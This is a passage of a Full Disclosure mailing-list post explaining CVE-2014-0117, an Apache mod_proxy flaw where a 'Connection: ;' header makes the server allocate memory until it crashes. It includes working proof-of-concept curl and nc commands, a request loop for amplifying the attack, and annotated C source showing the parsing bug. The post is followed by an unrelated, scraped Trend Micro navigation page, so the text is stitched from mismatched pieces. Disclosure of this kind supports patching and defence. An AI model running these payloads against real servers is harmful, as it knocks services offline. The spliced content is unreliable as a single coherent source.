branches.

If apache is configured with mod_proxy module (for example in front of
a tomcat, or proxypassing requests to other backend servers), it is
possible
to use all available memory on the server and potentially cause an OOM
condition that requires a reboot. In our tests, a single requests was
causing
apache to spin and keep allocating memory (gigabytes in seconds). A
simple bash
script that does this X time can speed the process up.

Bug can be triggered in request or response.

PoC (request):
-- cut --
curl -H 'Connection: ;' <http://127.0.0.1/>
-- cut --

PoC (response):
printf "HTTP/1.1 200 OKrnConnection: ;rnrn" | nc -l -p 80
Example config to replicate it, in httpd.conf :
-- cut --

  BalancerMember <http://127.0.0.1:8100>

ProxyPass / balancer://mycluster
-- cut --

then listen on port 8100 :
-- cut --
nc -l -p 8100
-- cut --

Then send a request with "Connection: ;" header and watch the memory
usage.
-- cut --
curl -H 'Connection: ;' <http://127.0.0.1/>
-- cut --

Single request will usually get killed with the following message:
-- cut --
[crit] Memory allocation failed, aborting process.
[core:notice] [pid 3205:tid 139786428621120] AH00051: child pid 4212
exit signal Aborted (6), possible coredump in
-- cut --

hence it may be more visible  on machines with huge ram by running
more requests, ideally
concurrently but this should do as well for demonstration purposes:
-- cut --
for i in `seq 1 100` ; do curl -m 1 -H 'Connection: ;'
<http://127.0.0.1/> ; done
-- cut --
Now where the problem is: incorrect parsing in find_conn_headers, it
only moves
the pointer when it encounters a comma, and calls ap_get_token which
returns an empty
string as it skips over ';'.
// key == 'Connection'
// val == ';'

static int find_conn_headers(void *data, const char *key, const char
*val)
{
    header_connection *x = data;
    const char *name;

    do {
        while (*val == ',') {                  // jump over expected
comma separator
            val++;
        }
        name = ap_get_token(x->pool, &val, 0); // returns empty string
in our case
        if (!strcasecmp(name, "close")) {      // not mached, branch
not taken
            x->closed = 1;
        }
        if (!x->first) {                      // branch taken
            x->first = name;                  // "" as name is empty
        }
        else {                                // branch not taken due
to above
            const char **elt;
            if (!x->array) {
                x->array = apr_array_make(x->pool, 4, sizeof(char *));
            }
            elt = apr_array_push(x->array);
            *elt = name;
        }
    } while (*val);                        // val is still ';'

    return 1;
}

/* Retrieve a token, spacing over it and returning a pointer to
 * the first non-white byte afterwards.  Note that these tokens
 * are delimited by semis and commas; and can also be delimited
 * by whitespace at the caller's option.
 */

AP_DECLARE(char *) ap_get_token(apr_pool_t *p, const char
**accept_line,
                                int accept_white)
{
    const char *ptr = *accept_line;
    const char *tok_start;
    char *token;
    int tok_len;

    /* Find first non-white byte */

    while (apr_isspace(*ptr))
        ++ptr;

    tok_start = ptr;                          // ';'

    /* find token end, skipping over quoted strings.
     * (comments are already gone).
     */

    while (*ptr && (accept_white || !apr_isspace(*ptr))
           && *ptr != ';' && *ptr != ',') {   // not satisfied as ';'
        if (*ptr++ == '"')                    // skips the if itself
            while (*ptr)
                if (*ptr++ == '"')
                    break;
    }

    tok_len = ptr - tok_start;                    // 0
    token = apr_pstrndup(p, tok_start, tok_len);  // token = ""

    /* Advance accept_line pointer to the next non-white byte */

    while (apr_isspace(*ptr))                    // not a space
        ++ptr;

    *accept_line = ptr;
    return token;
}
We hope you enjoyed it.

Regards,
Marek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466

```

**Attachment:
[cve-2014-0117.txt](att-117/cve-2014-0117.txt)**

*Description:*

```

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](116)
[By Date](date.html#117)
[![Next](/images/right-icon-16x16.png)](118)

[![Previous](/images/left-icon-16x16.png)](114)
[By Thread](index.html#117)
[![Next](/images/right-icon-16x16.png)](118)

### Current thread:

* **Apache HTTPd - description of the CVE-2014-0117.** *funky . koval (Jul 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.trendmicro.com_7e785017_20250126_093431.html ===


[![](/content/dam/trendmicro/global/en/core/images/logos/tm-logo-red-new-navigation.svg)

Business](/en_ie/business.html)

search
close

* Solutions
  + [By Challenge](/en_ie/business/solutions/challenges.html)
    - [By Challenge](/en_ie/business/solutions/challenges.html)
      * By Challenge
        [Learn more](/en_ie/business/solutions/challenges.html)
    - [Understand, Prioritize & Mitigate Risks](/en_ie/business/solutions/challenges/cyber-risk.html)
      * Understand, Prioritize & Mitigate Risks

        Improve your risk posture with attack surface management

        [Learn more](/en_ie/business/solutions/challenges/cyber-risk.html)
    - [Protect Cloud-Native Apps](/en_ie/business/solutions/challenges/cloud-native-applications.html)
      * Protect Cloud-Native Apps

        Security that enables business outcomes

        [Learn more](/en_ie/business/solutions/challenges/cloud-native-applications.html)
    - [Protect Your Hybrid World](/en_ie/business/solutions/challenges/hybrid-cloud.html)
      * Protect Your Hybrid, Multi-Cloud World

        Gain visibility and meet business needs with security

        [Learn more](/en_ie/business/solutions/challenges/hybrid-cloud.html)
    - [Securing Your Borderless Workforce](/en_ie/business/solutions/challenges/infrastructure-security.html)
      * Securing Your Borderless Workforce

        Connect with confidence from anywhere, on any device

        [Learn more](/en_ie/business/solutions/challenges/infrastructure-security.html)
    - [Eliminate Network Blind Spots](/en_ie/business/solutions/challenges/network-security.html)
      * Eliminate Network Blind Spots

        Secure users and key operations throughout your environment

        [Learn more](/en_ie/business/solutions/challenges/network-security.html)
    - [See More. Respond Faster.](/en_ie/business/solutions/challenges/detection-response.html)
      * See More. Respond Faster.

        Move faster than your adversaries with powerful purpose-built XDR, attack surface risk management, and zero trust capabilities

        [Learn more](/en_ie/business/solutions/challenges/detection-response.html)
    - [Extend Your Team](/en_ie/business/solutions/challenges/managed-services.html)
      * Extend Your Team. Respond to Threats Agilely

        Maximize effectiveness with proactive risk reduction and managed services

        [Learn more](/en_ie/business/solutions/challenges/managed-services.html)
    - [Operationalizing Zero Trust](/en_ie/business/solutions/challenges/zero-trust.html)
      * Operationalizing Zero Trust

        Understand your attack surface, assess your risk in real time, and adjust policies across network, workloads, and devices from a single console

        [Learn more](/en_ie/business/solutions/challenges/zero-trust.html)
  + [By Role](/en_ie/business/solutions/role.html)
    - [By Role](/en_ie/business/solutions/role.html)
      * By Role
        [Learn more](/en_ie/business/solutions/role.html)
    - [CISO](/en_ie/business/solutions/role/ciso.html)
      * CISO

        Drive business value with measurable cybersecurity outcomes

        [Learn more](/en_ie/business/solutions/role/ciso.html)
    - [SOC Manager](/en_ie/business/solutions/role/soc.html)
      * SOC Manager

        See more, act faster

        [Learn more](/en_ie/business/solutions/role/soc.html)
    - [Infrastructure Manager](/en_ie/business/solutions/role/it-infrastructure-operations.html)
      * Infrastructure Manager

        Evolve your security to mitigate threats quickly and effectively

        [Learn more](/en_ie/business/solutions/role/it-infrastructure-operations.html)
    - [Cloud Builder and Developer](/en_ie/business/solutions/role/cloud-developer.html)
      * Cloud Builder and Developer

        Ensure code runs only as intended

        [Learn more](/en_ie/business/solutions/role/cloud-developer.html)
    - [Cloud Security Ops](/en_ie/business/solutions/role/cloud-operations.html)
      * Cloud Security Ops

        Gain visibility and control with security designed for cloud environments

        [Learn more](/en_ie/business/solutions/role/cloud-operations.html)
  + [By Industry](/en_ie/business/capabilities/solutions-for.html)
    - [By Industry](/en_ie/business/capabilities/solutions-for.html)
      * By Industry
        [Learn more](/en_ie/business/capabilities/solutions-for.html)
    - [Automotive](https://vicone.com/en)
      * Automotive
        [Learn more](https://vicone.com/en)
    - [5G Networks](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
      * 5G Networks
        [Learn more](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
    - [Electric Utility](/en_ie/business/solutions/iot/ics-ot.html)
      * Electric Utility

        ICS/OT Security for the electric utility

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Oil & Gas](/en_ie/business/solutions/iot/ics-ot.html)
      * Oil & Gas

        ICS/OT Security for the oil and gas utility industry

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Manufacturing](/en_ie/business/solutions/iot/ics-ot.html)
      * Manufacturing

        Protecting your factory environments – from traditional devices to state-of-the-art infrastructures

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Public Sector](/content/trendmicro/en_ie/business/public-sector)
      * Public Sector
        [Learn more](/content/trendmicro/en_ie/business/public-sector)
    - [Higher Education](/content/trendmicro/en_ie/business/higher-education)
      * Higher Education
        [Learn more](/content/trendmicro/en_ie/business/higher-education)
    - [Healthcare](/content/trendmicro/en_ie/business/healthcare-cybersecurity)
      * Healthcare

        Protect patient data, devices, and networks while meeting regulations

        [Learn more](/content/trendmicro/en_ie/business/healthcare-cybersecurity)
    - [Financial Services](/content/trendmicro/en_ie/business/financial-services-cybersecurity)
      * Financial Services

        AI-powered cyber risk management to safeguard customer data, build trust and simplify compliance

        [Learn more](/content/trendmicro/en_ie/business/financial-services-cybersecurity)
  + [Small & Midsized Business Security](/en_ie/small-business/platform.html)
    - Small & Midsized Business Security

      Stop threats with easy-to-use solutions designed for your growing business

      [Learn more](/en_ie/small-business/platform.html)
* Platform
  + [Vision One Platform](/en_ie/business/products/one-platform.html)
    - [Vision One Platform](/en_ie/business/products/one-platform.html)
      * Trend Vision One
        Our Unified Platform

        Bridge threat protection and cyber risk management

        [Learn more](/en_ie/business/products/one-platform.html)

        ![](/content/dam/trendmicro/global/en/core/images/console-images/navigation/trend-vision-one-laptop-console-nav.svg)
    - [AI Companion](/en_ie/business/technologies/ai-companion.html)
      * Trend Vision One Companion

        Your generative AI cybersecurity assistant

        [Learn more](/en_ie/business/technologies/ai-companion.html)
  + [Attack Surface Management](/en_ie/business/products/attack-surface-management.html)
    - Attack Surface Management

      Stop breaches before they happen

      [Learn more](/en_ie/business/products/attack-surface-management.html)

      ![](https://trendmicro.scene7.com/is/image/trendmicro/asrm-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [XDR (Extended Detection & Response)](/en_ie/business/products/detection-response/xdr.html)
    - XDR (Extended Detection & Response)

      Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

      [Learn more](/en_ie/business/products/detection-response/xdr.html)

      ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Endpoint Security](/en_ie/business/products/endpoint-security.html)
    - [Endpoint Security](/en_ie/business/products/endpoint-security.html)
      * Endpoint Security Overview

        Defend the endpoint through every stage of an attack

        [Learn more](/en_ie/business/products/endpoint-security.html)
    - [Industrial Endpoint Security](/en_ie/business/products/iot/industrial-endpoint-security.html)
      * Industrial Endpoint Security
        [Learn more](/en_ie/business/products/iot/industrial-endpoint-security.html)
    - [Workload Security](/en_ie/business/products/endpoint-security/workload-security.html)
      * Workload Security

        Optimized prevention, detection, and response for endpoints, servers, and cloud workloads

        [Learn more](/en_ie/business/products/endpoint-security/workload-security.html)
    - [Mobile Security](/en_ie/business/products/user-protection/sps/mobile-security-enterprise.html)
      * Mobile Security

        On-premises and cloud protection against malware, malicious applications, and other mobile threats

        [Learn more](/en_ie/business/products/user-protection/sps/mobile-security-enterprise.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/sps-mobile-security-enterprise-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [XDR for Endpoint](/en_ie/business/products/detection-response/xdr.html)
      * XDR for Endpoint

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Cloud Security](/en_ie/business/products/hybrid-cloud.html)
    - [Cloud Security](/en_ie/business/products/hybrid-cloud.html)
      * Trend Vision One™
        Cloud Security Overview

        The most trusted cloud security platform for developers, security teams, and businesses

        [Learn more](/en_ie/business/products/hybrid-cloud.html)
    - [Container Security](/en_ie/business/products/hybrid-cloud/cloud-one-container-image-security.html)
      * Container Security

        Simplify security for your cloud-native applications with advanced container image scanning, policy-based admission control, and container runtime protection

        [Learn more](/en_ie/business/products/hybrid-cloud/cloud-one-container-image-security.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/cloud-one-container-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [File Security](/en_ie/business/products/hybrid-cloud/cloud-one-file-storage-security.html)
      * File Security

        Protect application workflow and cloud storage against advanced threats

        [Learn more](/en_ie/business/products/hybrid-cloud/cloud-one-file-storage-security.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/cloud-one-file-storage-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [Attack Surface Risk Management for Cloud](/en_ie/business/products/detection-response/attack-surface-management.html)
      * Attack Surface Risk Management for Cloud

        Proactively discover, assess, and reduce cyber risk

        [Learn more](/en_ie/business/products/detection-response/attack-surface-management.html)
    - [XDR for Cloud](/en_ie/business/products/detection-response/xdr.html)
      * XDR for Cloud

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Network Security](/en_ie/business/products/network.html)
    - [Network Security](/en_ie/business/products/network.html)
      * Network Security Overview

        Expand the power of XDR with network detection and response

        [Learn more](/en_ie/business/products/network.html)
    - [Network Intrusion Prevention (IPS)](/en_ie/business/products/network/intrusion-prevention.html)
      * Network Intrusion Prevention (IPS)

        Protect against known, unknown, and undisclosed vulnerabilities in your network

        [Learn more](/en_ie/business/products/network/intrusion-prevention.html)
    - [Breach Detection System (BDS)](/en_ie/business/products/network/advanced-threat-protection.html)
      * Breach Detection System (BDS)

        Detect and respond to targeted attacks moving inbound, outbound, and laterally

        [Learn more](/en_ie/business/products/network/advanced-threat-protection.html)
    - [Secure Service Edge (SSE)](/en_ie/business/products/network/zero-trust-secure-access.html)
      * Secure Service Edge (SSE)

        Redefine trust and secure digital transformation with continuous risk assessments

        [Learn more](/en_ie/business/products/network/zero-trust-secure-access.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/zero-trust-access-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [Industrial Network Security](/en_ie/business/products/iot/industrial-network-security.html)
      * Industrial Network Security
        [Learn more](/en_ie/business/products/iot/industrial-network-security.html)
    - [XDR for Network](/en_ie/business/products/detection-response/xdr.html)
      * XDR for Network

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [5G Network Security](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
      * 5G Network Security
        [Learn more](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
  + [Email Security](/en_ie/business/products/email-security.html)
    - [Email Security](/en_ie/business/products/email-security.html)
      * Email Security

        Stop phishing, malware, ransomware, fraud, and targeted attacks from infiltrating your enterprise

        [Learn more](/en_ie/business/products/email-security.html)
    - [Email and Collaboration Security](/en_ie/business/products/user-protection/sps/email-and-collaboration.html)
      * Trend Vision One™
        Email and Collaboration Security

        Stop phishing, ransomware, and targeted attacks on any email service including Microsoft 365 and Google Workspace

        [Learn more](/en_ie/business/products/user-protection/sps/email-and-collaboration.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/email-security-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Threat Insights](/en_ie/business/products/one-platform/threat-insights.html)
    - Threat Insights

      See threats coming from miles away

      [Learn more](/en_ie/business/products/one-platform/threat-insights.html)
  + [All Products, Services, and Trials](/en_ie/business/products.html)
    - All Products, Services, and Trials
      [Learn more](/en_ie/business/products.html)

      ![](https://trendmicro.scene7.com/is/image/trendmicro/all-products-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [OT Security](/en_ie/business/solutions/iot/ics-ot.html)
    - [OT Security](/en_ie/business/solutions/iot/ics-ot.html)
      * OT Security

        Learn about solutions for ICS / OT security.

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Industrial Endpoint Security](/content/trendmicro/en_ie/business/products/iot/industrial-endpoint-security)
      * Industrial Endpoint Security
        [Learn more](/content/trendmicro/en_ie/business/products/iot/industrial-endpoint-security)
    - [Industrial Network Security](/en_ie/business/products/iot/industrial-network-security.html)
      * Industrial Network Security
        [Industrial Network Security](/en_ie/business/products/iot/industrial-network-security.html)
    - [XDR for OT](/en_ie/business/products/detection-response/xdr.html)
      * XDR for OT

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Identity Security](/en_ie/business/products/identity.html)
    - Identity Security

      End-to-end identity security from identity posture management to detection and response

      [Learn more](/en_ie/business/products/identity.html)
  + [On-Premises Data Sovereignty](/en_ie/business/products/sovereign-private-cloud.html)
    - On-Premises Data Sovereignty

      Prevent, detect, respond and protect without compromising data sovereignty

      [Learn more](/en_ie/business/products/sovereign-private-cloud.html)
* Research
  + [Research](/en_ie/about/threat-research.html)
    - [Research](/en_ie/about/threat-research.html)
      * Research
        [Learn more](/en_ie/about/threat-research.html)
    - [Research, News, and Perspectives](/en_ie/research.html)
      * Research, News, and Perspectives
        [Learn more](/en_ie/research.html)
    - [Research and Analysis](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/)
      * Research and Analysis
        [Learn more](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/)
    - [Security News](https://www.trendmicro.com/vinfo/ie/security/news/)
      * Security News
        [Learn more](https://www.trendmicro.com/vinfo/ie/security/news/)
    - [Zero Day Initiatives (ZDI)](https://www.zerodayinitiative.com/about/)
      * Zero Day Initiatives (ZDI)
        [Learn more](https://www.zerodayinitiative.com/about/)
* Services
  + [Our Services](/en_ie/business/services/service-one.html)
    - [Our Services](/en_ie/business/services/service-one.html)
      * Our Services
        [Learn more](/en_ie/business/services/service-one.html)
    - [Service Packages](/en_ie/business/services/service-one.html)
      * Service Packages

        Augment security teams with 24/7/365 managed detection, response, and support

        [Learn more](/en_ie/business/services/service-one.html)
    - [Managed XDR](/en_ie/business/services/managed-xdr.html)
      * Managed XDR

        Augment threat detection with expertly managed detection and response (MDR) for email, endpoints, servers, cloud workloads, and networks

        [Learn more](/en_ie/business/services/managed-xdr.html)
    - [Incident Response](/en_ie/business/services/incident-response.html)
      * [Incident Response](/en_ie/business/services/incident-response.html)
        + Incident Response

          Our trusted experts are on call whether you're experiencing a breach or looking to proactively improve your IR plans

          [Learn more](/en_ie/business/services/incident-response.html)
      * [Insurance Carriers and Law Firms](/en_ie/business/services/incident-response/insurance-law.html)
        + Insurance Carriers and Law Firms

          Stop breaches with the best response and detection technology on the market and reduce clients’ downtime and claim costs

          [Learn more](/en_ie/business/services/incident-response/insurance-law.html)
    - [Support Services](/en_ie/business/services/support-services.html)
      * Support Services
        [Learn more](/en_ie/business/services/support-services.html)
* Partners
  + [Partner Program](/en_ie/partners/program.html)
    - [Partner Program](/en_ie/partners/program.html)
      * Partner Program Overview

        Grow your business and protect your customers with the best-in-class complete, multilayered security

        [Learn more](/en_ie/partners/program.html)
    - [Partner Competencies](/en_ie/partners/competencies.html)
      * Partner Competencies

        Stand out to customers with competency endorsements that showcase your expertise

        [Learn more](/en_ie/partners/competencies.html)
    - [Partner Successes](/en_ie/partners/partner-stories.html)
      * Partner Successes
        [Learn more](/en_ie/partners/partner-stories.html)
    - [Managed Security Service Provider](/en_ie/partners/program/managed-security-service-provider.html)
      * Managed Security Service Provider

        Deliver modern security operations services with our industry-leading XDR

        [Learn more](/en_ie/partners/program/managed-security-service-provider.html)
    - [Managed Service Provider](/en_ie/partners/program/managed-service-provider.html)
      * Managed Service Provider

        Partner with a leading expert in cybersecurity, leverage proven solutions designed for MSPs

        [Learn more](/en_ie/partners/program/managed-service-provider.html)
  + [Alliance Partners](/en_ie/partners/alliance-partners.html)
    - [Alliance Partners](/en_ie/partners/alliance-partners.html)
      * Alliance Partners

        We work with the best to help you optimize performance and value

        [Learn more](/en_ie/partners/alliance-partners.html)
    - [Technology Alliance Partners](/en_ie/partners/alliance-partners/technology.html)
      * Technology Alliance Partners
        [Learn more](/en_ie/partners/alliance-partners/technology.html)
    - [Find Alliance Partners](/en_ie/partners/alliance-partners/explore-alliance-partners.html)
      * Find Alliance Partners
        [Learn more](/en_ie/partners/alliance-partners/explore-alliance-partners.html)
  + [Partner Resources](/en_ie/partners/resources.html)
    - [Partner Resources](/en_ie/partners/resources.html)
      * Partner Resources

        Discover resources designed to accelerate your business’s growth and enhance your capabilities as a Trend Micro partner

        [Learn more](/en_ie/partners/resources.html)
    - [Partner Portal Login](https://partner.trendmicro.com/)
      * Partner Portal Login
        [Login](https://partner.trendmicro.com/)
    - [Trend Campus](/en_ie/partners/campus.html)
      * Trend Campus

        Accelerate your learning with Trend Campus, an easy-to-use education platform that offers personalized technical guidance

        [Learn more](/en_ie/partners/campus.html)
    - [Co-Selling](/en_ie/partners/co-selling.html)
      * Co-Selling

        Access collaborative services designed to help you showcase the value of Trend Vision One™ and grow your business

        [Learn more](/en_ie/partners/co-selling.html)
    - [Become a Partner](https://resources.trendmicro.com/partner_program_get-info.html)
      * Become a Partner
        [Learn more](https://resources.trendmicro.com/partner_program_get-info.html)
  + [Find Partners](https://partner.trendmicro.com/partner-locator-home/)
    - Find Partners

      Locate a partner from whom you can purchase Trend Micro solutions

      [Learn more](https://partner.trendmicro.com/partner-locator-home/)
* Company
  + [Why Trend Micro](/en_ie/about/why-trend-micro.html)
    - [Why Trend Micro](/en_ie/about/why-trend-micro.html)
      * Why Trend Micro
        [Learn more](/en_ie/about/why-trend-micro.html)
    - [Customer Success Stories](/en_ie/about/customer-stories.html)
      * Customer Success Stories
        [Learn more](/en_ie/about/customer-stories.html)
    - [Industry Accolades](/en_ie/about/industry-recognition.html)
      * Industry Accolades
        [Learn more](/en_ie/about/industry-recognition.html)
    - [Strategic Alliances](/en_ie/partners/alliance-partners.html)
      * Strategic Alliances
        [Learn more](/en_ie/partners/alliance-partners.html)
    - [The Human Connection](/content/trendmicro/en_ie/about/human-connections)
      * The Human Connection
        [Learn more](/content/trendmicro/en_ie/about/human-connections)
  + [Compare Trend Micro](/en_ie/about/compare.html)
    - [Compare Trend Micro](/en_ie/about/compare.html)
      * Compare Trend Micro

        See how Trend outperforms the competition

        [Let's go](/en_ie/about/compare.html)
    - [vs. Crowdstrike](/en_ie/about/compare/trend-vs-crowdstrike.html)
      * Trend Micro vs. Crowdstrike

        Crowdstrike provides effective cybersecurity through its cloud-native platform, but its pricing may stretch budgets, especially for organizations seeking cost-effective scalability through a true single platform

        [Let's go](/en_ie/about/compare/trend-vs-crowdstrike.html)
    - [vs. Microsoft](/en_ie/about/compare/trend-vs-microsoft.html)
      * Trend Micro vs. Microsoft

        Microsoft offers a foundational layer of protection, yet it often requires supplemental solutions to fully address customers' security problems

        [Let's go](/en_ie/about/compare/trend-vs-microsoft.html)
    - [vs. Palo Alto Networks](/en_ie/about/compare/trend-vs-palo-alto-networks.html)
      * Trend Micro vs. Palo Alto Networks

        Palo Alto Networks delivers advanced cybersecurity solutions, but navigating its comprehensive suite can be complex and unlocking all capabilities requires significant investment

        [Let's go](/en_ie/about/compare/trend-vs-palo-alto-networks.html)
  + [About Us](/en_ie/about.html)
    - [About Us](/en_ie/about.html)
      * About Us
        [Learn more](/en_ie/about.html)
    - [Trust Center](/en_ie/about/trust-center.html)
      * Trust Center
        [Learn more](/en_ie/about/trust-center.html)
    - [History](/en_ie/about/history-vision-values.html)
      * History
        [Learn more](/en_ie/about/history-vision-values.html)
    - [Diversity, Equity and Inclusion](/en_ie/about/diversity-inclusion.html)
      * Diversity, Equity and Inclusion
        [Learn more](/en_ie/about/diversity-inclusion.html)
    - [Corporate Social Responsibility](/en_ie/about/corporate-social-responsibility.html)
      * Corporate Social Responsibility
        [Learn more](/en_ie/about/corporate-social-responsibility.html)
    - [Leadership](/en_ie/about/leaders.html)
      * Leadership
        [Learn more](/en_ie/about/leaders.html)
    - [Security Experts](/en_ie/about/leading-experts.html)
      * Security Experts
        [Learn more](/en_ie/about/leading-experts.html)
    - [Internet Safety and Cybersecurity Education](/en_ie/initiative-education.html)
      * Internet Safety and Cybersecurity Education
        [Learn more](/en_ie/initiative-education.html)
    - [Legal](/en_ie/about/legal.html)
      * Legal
        [Learn more](/en_ie/about/legal.html)
    - [Investors](/en_us/about/investor-relations.html)
      * Investors
        [Learn more](/en_us/about/investor-relations.html)
    - [Formula E Racing](/en_ie/business/campaigns/formula-e.html)
      * Formula E Racing
        [Learn more](/en_ie/business/campaigns/formula-e.html)
  + [Connect With Us](https://newsroom.trendmicro.com/)
    - [Connect With Us](https://newsroom.trendmicro.com/)
      * Connect With Us
        [Learn more](https://newsroom.trendmicro.com/)
    - [Newsroom](https://newsroom.trendmicro.com/)
      * Newsroom
        [Learn more](https://newsroom.trendmicro.com/)
    - [Events](/en_ie/about/events.html)
      * Events
        [Learn more](/en_ie/about/events.html)
    - [Careers](/en_ie/about/careers.html)
      * Careers
        [Learn more](/en_ie/about/careers.html)
    - [Webinars](/en_ie/about/webinars.html)
      * Webinars
        [Learn more](/en_ie/about/webinars.html)
    - [Executive Briefing Center](/en_ie/business/campaigns/executive-briefing-center.html)
      * Executive Briefing Center

        Experience Trend's culture of innovation and world class threat intelligence

        [Learn more](/en_ie/business/campaigns/executive-briefing-center.html)

Back

Back

Back

Back

* [Free Trials](/en_ie/business/products/trials.html#detection-response)
* [Contact Us](/en_ie/business/get-info-form.html)

[Looking for home solutions?](/en_ie/forHome.html)

[Under Attack?](https://resources.trendmicro.com/Under-Attack-Form-eu.html)
3 Alerts

Back

Unread
All

* [AI Pulse: Reflecting on 2024’s defining AI trends](/en_ie/research/25/a/top-ai-trends-from-2024-review.html)
  close

  [Read more >](/en_ie/research/25/a/top-ai-trends-from-2024-review.html)
* [Redefining Defense: Mapping container security to MITRE ATT&CK](/en_ie/research/25/a/mitre-attack-container-security-detection.html)
  close

  [Learn more >](/en_ie/research/25/a/mitre-attack-container-security-detection.html)
* [How the English cybercriminal underground is evolving amid new tech and increased scrutiny](https://www.trendmicro.com/vinfo/ie/security/news/cybercrime-and-digital-threats/bridging-divides-transcending-borders-the-current-state-of-the-english-underground)
  close

  [Read report >](https://www.trendmicro.com/vinfo/ie/security/news/cybercrime-and-digital-threats/bridging-divides-transcending-borders-the-current-state-of-the-english-underground)

Support

* [Business Support Portal](https://success.trendmicro.com/en-US/)
* [Education and Certification](/en_ie/business/services/support-services/education.html)
* [Contact Support](https://success.trendmicro.com/contact-support-europe)
* [Find a Support Partner](https://partner.trendmicro.com/partner-locator-home/)

Resources

* [AI Security](/en_ie/business/ai.html)
* [Trend Micro vs. Competition](/en_ie/about/compare.html)
* [Cyber Risk Assessments](https://resources.trendmicro.com/security-assessment-service-eu.html)
* [What Is?](/en_ie/what-is.html)
* [Threat Encyclopedia](https://www.trendmicro.com/vinfo/ie/threat-encyclopedia/)
* [Cyber Insurance](/en_ie/business/cyber-insurance.html)
* [Glossary of Terms](https://www.trendmicro.com/vinfo/ie/security/definition/a)
* [Webinars](/en_ie/about/webinars.html)

Log In

* [Vision One](https://signin.v1.trendmicro.com/)
* [Support](https://success.trendmicro.com/en-US/)
* [Partner Portal](https://partner.trendmicro.com/)
* [Cloud One](https://cloudone.trendmicro.com/)
* [Product Activation and Management](https://tm.login.trendmicro.com/simplesaml/saml2/idp/SSOService.php)
* [Referral Affiliate](https://signup.cj.com/member/signup/publisher/?cid=1867119#/branded?_k=xaeu3t)

Back

arrow\_back
search

|  |
| --- |

close

# Named a Leader in the 2024 Gartner® Magic Quadrant™ for Email Security

Discover email security that equips you with integrated workspace protection, versatile implementation, and advanced threat intelligence.

* [Read the report](https://resources.trendmicro.com/Gartner-MQ-ESP.html)
